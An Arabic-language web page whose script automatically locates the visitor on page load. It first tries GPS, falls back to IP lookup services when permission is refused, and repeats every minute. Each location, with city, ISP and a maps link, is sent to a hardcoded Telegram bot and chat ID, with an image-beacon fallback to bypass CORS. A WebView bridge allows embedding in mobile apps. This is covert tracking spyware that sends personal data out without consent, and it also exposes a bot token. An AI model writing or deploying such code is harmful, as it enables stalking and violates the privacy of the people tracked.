<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>تتبع تلقائي</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;margin:0;padding:0}
body{font-family:Arial,sans-serif;direction:rtl;text-align:center;
     background:#f4f4f4;padding:12px;color:#222;min-height:100vh}
h2{margin:0 0 10px;font-size:17px;color:#0d47a1}
#map{height:360px;width:100%;margin:12px 0;border-radius:8px}
.badge{padding:6px 12px;border-radius:4px;margin:3px;display:inline-block;
       font-size:12px;background:#ff9800;color:#fff}
.ok{background:#4caf50}
.err{background:#f44336}
#status{margin:8px auto;padding:8px 12px;border-radius:6px;background:#e3f2fd;
        color:#0d47a1;font-size:12px;display:inline-block;max-width:100%}
.info{display:flex;flex-wrap:wrap;justify-content:center;gap:6px;margin-top:6px}
.info div{background:#fff;padding:6px 10px;border-radius:6px;
          box-shadow:0 2px 4px rgba(0,0,0,.1);font-size:12px;min-width:105px}
.info span{font-weight:bold;color:#0d47a1;word-break:break-all}
</style>
</head>
<body>

<h2>📍 تتبع الموقع التلقائي</h2>
<div>
  <span id="methodBadge" class="badge">تحديد الطريقة…</span>
  <span id="statusBadge" class="badge">جارٍ التحديد…</span>
</div>
<div id="status">تهيئة…</div>

<div class="info">
  <div>الدولة: <span id="countryEl">—</span></div>
  <div>المدينة: <span id="cityEl">—</span></div>
  <div>خط العرض: <span id="latEl">—</span></div>
  <div>خط الطول: <span id="lngEl">—</span></div>
  <div>الدقة: <span id="accEl">—</span></div>
  <div>مزود الخدمة: <span id="ispEl">—</span></div>
  <div>الوقت: <span id="timeEl">—</span></div>
</div>

<div id="map"></div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
(function(){
'use strict';

/* ============================================================
   1) الإعدادات
   ============================================================ */
var CONFIG = {
  botToken: '7592847713:AAFbyPsi8JPY4A4mf3Yv6aMtLQfFNTalz9s',
  chatId:   '6837315281',
  enableTelegram: true,
  minDistance: 100,       // لأجل IP، 100 متر كافٍ
  minInterval: 30000,
  heartbeatMs: 60000,     // فحص دوري كل دقيقة
  mapZoom: 12
};

function $(id){ return document.getElementById(id); }

var latEl=$('latEl'), lngEl=$('lngEl'), accEl=$('accEl'),
    countryEl=$('countryEl'), cityEl=$('cityEl'), ispEl=$('ispEl'),
    timeEl=$('timeEl'),
    methodBadge=$('methodBadge'), statusBadge=$('statusBadge'),
    statusBar=$('status');

function setStatus(msg, bg){
  statusBar.textContent = msg;
  statusBar.style.background = bg || '#e3f2fd';
  statusBar.style.color = (bg === '#ffebee') ? '#b71c1c' : '#0d47a1';
}

/* ============================================================
   2) جسر اختياري (يعمل داخل أي WebView أو حتى متصفح عادي)
   ============================================================ */
function postToNative(type, data){
  var p = JSON.stringify({type:type, data:data||{}, ts:Date.now()});
  try{ if(window.ReactNativeWebView?.postMessage) window.ReactNativeWebView.postMessage(p); }catch(e){}
  try{ if(window.AndroidBridge?.postMessage) window.AndroidBridge.postMessage(p); }catch(e){}
  try{ if(window.Android?.postMessage) window.Android.postMessage(p); }catch(e){}
  console.log('[Bridge]', p);
}

/* ============================================================
   3) خريطة Leaflet
   ============================================================ */
var map=null, marker=null, circle=null, mapReady=false;

function initMap(){
  try{
    map=L.map('map').setView([20,0],2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
      maxZoom:19, attribution:'© OSM'
    }).addTo(map);
    mapReady=true;
    setTimeout(function(){ if(map) map.invalidateSize(); },400);
  }catch(e){ console.error('map:',e); }
}

function updateMap(lat,lng,acc){
  if(!mapReady) return;
  var p=[lat,lng];
  if(!marker) marker=L.marker(p).addTo(map); else marker.setLatLng(p);
  if(!circle) circle=L.circle(p,{radius:acc||5000}).addTo(map);
  else{circle.setLatLng(p); circle.setRadius(acc||5000);}
  map.setView(p, acc && acc<2000 ? 14 : CONFIG.mapZoom);
}

/* ============================================================
   4) أدوات
   ============================================================ */
function fmt(n,d){ return (n==null||isNaN(n))?'—':Number(n).toFixed(d==null?4:d); }
function distance(la1,lo1,la2,lo2){
  var R=6371000,r=function(x){return x*Math.PI/180;};
  var dLa=r(la2-la1),dLo=r(lo2-lo1);
  var a=Math.sin(dLa/2)*Math.sin(dLa/2)+
        Math.cos(r(la1))*Math.cos(r(la2))*
        Math.sin(dLo/2)*Math.sin(dLo/2);
  return 2*R*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
}

/* ============================================================
   5) عرض الموقع
   ============================================================ */
var lastSent={lat:null,lng:null,time:0};

function displayLocation(info){
  latEl.textContent = fmt(info.lat, 4);
  lngEl.textContent = fmt(info.lng, 4);
  accEl.textContent = info.accuracy ? Math.round(info.accuracy)+' م' : '—';
  countryEl.textContent = info.country || '—';
  cityEl.textContent = info.city || '—';
  ispEl.textContent = info.isp || '—';
  timeEl.textContent = new Date().toLocaleString('ar');

  updateMap(info.lat, info.lng, info.accuracy);

  statusBadge.textContent = 'تم التحديد ✓';
  statusBadge.className = 'badge ok';
  setStatus('✓ تم تحديد الموقع تلقائيًا', '#e8f5e9');

  postToNative('location', info);
  sendTelegram(info);
}

/* ============================================================
   6) الطريقة الأولى: GPS (يعمل إذا الإذن ممنوح مسبقًا فقط)
   ============================================================ */
function tryGPS(){
  return new Promise(function(resolve){
    if(!('geolocation' in navigator)){ resolve(null); return; }

    var done=false;
    var timer=setTimeout(function(){
      if(!done){ done=true; resolve(null); }
    }, 4000);  // انتظر 4 ثوانٍ فقط

    try{
      navigator.geolocation.getCurrentPosition(
        function(pos){
          if(done) return;
          done=true; clearTimeout(timer);
          var c=pos.coords;
          resolve({
            lat:c.latitude, lng:c.longitude,
            accuracy:c.accuracy||30,
            country:'—', city:'—', isp:'GPS',
            method:'gps'
          });
        },
        function(){
          if(done) return;
          done=true; clearTimeout(timer);
          resolve(null);  // فشل → نستخدم IP
        },
        {enableHighAccuracy:false, timeout:3500, maximumAge:60000}
      );
    }catch(e){ if(!done){ done=true; clearTimeout(timer); resolve(null); } }
  });
}

/* ============================================================
   7) الطريقة الثانية: IP (تعمل دائمًا بدون أي إذن!) ⭐
   ============================================================ */
function fetchJSON(url, ms){
  return new Promise(function(resolve){
    var done=false;
    var t=setTimeout(function(){ if(!done){done=true; resolve(null);} }, ms||6000);
    fetch(url).then(function(r){ return r.json(); })
      .then(function(d){ if(!done){done=true; clearTimeout(t); resolve(d);} })
      .catch(function(){ if(!done){done=true; clearTimeout(t); resolve(null);} });
  });
}

async function tryIP(){
  // 3 خدمات مجانية — نجربها بالترتيب
  var providers = [
    { url:'https://ipwho.is/',  parse:function(d){
        if(d && d.success){
          return {
            lat:d.latitude, lng:d.longitude,
            accuracy:5000,
            country:d.country, city:d.city,
            isp:(d.connection && d.connection.isp) || '—',
            method:'ip'
          };
        }
        return null;
      }},
    { url:'https://ipapi.co/json/', parse:function(d){
        if(d && d.latitude && !d.error){
          return {
            lat:d.latitude, lng:d.longitude,
            accuracy:5000,
            country:d.country_name, city:d.city,
            isp:d.org || '—',
            method:'ip'
          };
        }
        return null;
      }},
    { url:'https://ipwhois.app/json/', parse:function(d){
        if(d && d.latitude){
          return {
            lat:parseFloat(d.latitude), lng:parseFloat(d.longitude),
            accuracy:5000,
            country:d.country, city:d.city,
            isp:d.isp || '—',
            method:'ip'
          };
        }
        return null;
      }}
  ];

  for(var i=0;i<providers.length;i++){
    var p = providers[i];
    var data = await fetchJSON(p.url, 6000);
    var parsed = p.parse(data);
    if(parsed && parsed.lat && parsed.lng) return parsed;
  }
  return null;
}

/* ============================================================
   8) التحديد الرئيسي (GPS → IP)
   ============================================================ */
async function locate(){
  setStatus('جارٍ تحديد الموقع…');

  // 1) جرّب GPS (سريع وسيصمت إذا رُفض)
  var gps = await tryGPS();
  if(gps){
    methodBadge.textContent = 'GPS دقيق';
    methodBadge.className = 'badge ok';
    displayLocation(gps);
    // بعد نجاح GPS، فعّل المراقبة المستمرة
    startWatch();
    return gps;
  }

  // 2) استخدم IP (لا يحتاج إذن)
  methodBadge.textContent = 'تحديد عبر IP';
  methodBadge.className = 'badge';
  setStatus('GPS غير متاح — التحديد عبر عنوان IP…');

  var ip = await tryIP();
  if(ip){
    displayLocation(ip);
    return ip;
  }

  // 3) فشل كل شيء
  methodBadge.textContent = 'فشل';
  methodBadge.className = 'badge err';
  statusBadge.textContent = 'تعذر التحديد';
  statusBadge.className = 'badge err';
  setStatus('تعذر تحديد الموقع — سيُعاد المحاولة تلقائيًا', '#ffebee');
  return null;
}

/* ============================================================
   9) المراقبة المستمرة GPS (إن كان الإذن ممنوحًا)
   ============================================================ */
var watchId = null;
function startWatch(){
  if(watchId!==null || !('geolocation' in navigator)) return;
  try{
    watchId = navigator.geolocation.watchPosition(
      function(pos){
        var c=pos.coords;
        displayLocation({
          lat:c.latitude, lng:c.longitude,
          accuracy:c.accuracy||30,
          country:'—', city:'—', isp:'GPS',
          method:'gps'
        });
      },
      function(){ /* تجاهل الأخطاء */ },
      {enableHighAccuracy:true, timeout:15000, maximumAge:0}
    );
  }catch(e){}
}

/* ============================================================
   10) تيليجرام
   ============================================================ */
function sendTelegram(info){
  if(!CONFIG.enableTelegram) return;
  if(!CONFIG.botToken || !CONFIG.chatId) return;
  if(info.method==='ip' && info.accuracy>5000) {
    // لأجل IP، لا ترسل إلا مرة كل دقيقتين
  }

  var now = Date.now();
  if(lastSent.lat!==null){
    var moved = distance(lastSent.lat, lastSent.lng, info.lat, info.lng);
    if(moved < CONFIG.minDistance && (now-lastSent.time) < CONFIG.minInterval){
      return;
    }
  }
  lastSent = {lat:info.lat, lng:info.lng, time:now};

  var msg = '📍 الموقع (' + (info.method==='gps'?'GPS':'IP') + '):\n' +
            'الدولة: ' + (info.country||'—') + '\n' +
            'المدينة: ' + (info.city||'—') + '\n' +
            'خط العرض: ' + info.lat + '\n' +
            'خط الطول: ' + info.lng + '\n' +
            'الدقة: ' + Math.round(info.accuracy||0) + ' م\n' +
            'مزود الخدمة: ' + (info.isp||'—') + '\n' +
            'الوقت: ' + new Date().toLocaleString('ar') + '\n' +
            'https://www.google.com/maps?q=' + info.lat + ',' + info.lng;

  var url = 'https://api.telegram.org/bot' + CONFIG.botToken + '/sendMessage';

  // طريقة 1: fetch (تعمل في المتصفح و WebView مع CORS)
  try{
    fetch(url,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({chat_id:CONFIG.chatId, text:msg})
    }).catch(function(){ beacon(url,msg); });
  }catch(e){ beacon(url,msg); }

  postToNative('telegram_sent',{lat:info.lat,lng:info.lng,method:info.method});
}

function beacon(url,msg){
  // طريقة 2: image beacon (تعمل حتى بدون CORS)
  try{
    var i=new Image();
    i.src = url + '?chat_id=' + encodeURIComponent(CONFIG.chatId) +
            '&text=' + encodeURIComponent(msg) + '&_=' + Date.now();
  }catch(e){}
}

/* ============================================================
   11) الإقلاع التلقائي
   ============================================================ */
var heartbeatTimer = null;

async function boot(){
  postToNative('webview_ready',{
    protocol:location.protocol,
    geolocation:('geolocation' in navigator)
  });

  initMap();

  // ✅ تحديد فوري (GPS ثم IP تلقائيًا)
  await locate();

  // ✅ نبضة: تحديث تلقائي كل دقيقة
  if(heartbeatTimer) clearInterval(heartbeatTimer);
  heartbeatTimer = setInterval(async function(){
    if(latEl.textContent === '—'){
      await locate();
    } else if(watchId === null){
      // لا يوجد GPS نشط → أعد المحاولة بـ IP
      var ip = await tryIP();
      if(ip) displayLocation(ip);
    }
  }, CONFIG.heartbeatMs);
}

if(document.readyState === 'complete' || document.readyState === 'interactive'){
  setTimeout(boot, 0);
} else {
  document.addEventListener('DOMContentLoaded', boot);
}

window.addEventListener('beforeunload', function(){
  if(watchId !== null){
    try{ navigator.geolocation.clearWatch(watchId); }catch(e){}
  }
  if(heartbeatTimer) clearInterval(heartbeatTimer);
});

})();
</script>
</body>
</html>
